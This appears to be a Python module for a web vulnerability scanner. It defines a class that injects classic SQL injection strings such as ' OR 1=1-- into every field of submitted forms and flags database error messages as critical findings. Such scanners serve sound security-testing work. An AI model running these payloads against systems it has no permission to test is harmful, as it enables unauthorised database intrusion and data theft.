import requests

class SQLiScanner:
    def __init__(self, session):
        self.session = session
        # Common SQL injection payloads
        self.payloads = ["' OR '1'='1", '" OR ""="', "admin' --", "' OR 1=1--"]
        # Common database error strings we look for in the HTML response
        self.errors = [
            "you have an error in your sql syntax", 
            "warning: mysql", 
            "unclosed quotation mark", 
            "quoted string not properly terminated"
        ]
        self.vulnerabilities = []

    def scan_forms(self, forms):
        """Iterates through extracted forms and injects SQLi payloads."""
        print("[*] Starting SQLi Scanning on extracted forms...")
        for form in forms:
            action = form.get('action')
            method = form.get('method')
            inputs = form.get('inputs')

            # Test each payload one by one
            for payload in self.payloads:
                form_data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        # Inject the SQL payload into every field
                        form_data[input_name] = payload

                self._submit_and_check(action, method, form_data, payload)

    def _submit_and_check(self, action, method, data, payload):
        """Submits payload and checks for database syntax errors in the response."""
        try:
            if method == 'post':
                response = self.session.post(action, data=data)
            else:
                response = self.session.get(action, params=data)
            
            # The core detection logic: checking for database error messages
            for error in self.errors:
                if error in response.text.lower():
                    print(f"[!] CRITICAL SEVERITY: SQLi found at {action} with payload: {payload}")
                    self.vulnerabilities.append({
                        'type': 'SQLi',
                        'severity': 'Critical',
                        'url': action,
                        'payload': payload
                    })
                    break # Stop testing this form if it's already vulnerable
                    
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing SQLi on {action}: {e}")

    def get_results(self):
        return self.vulnerabilities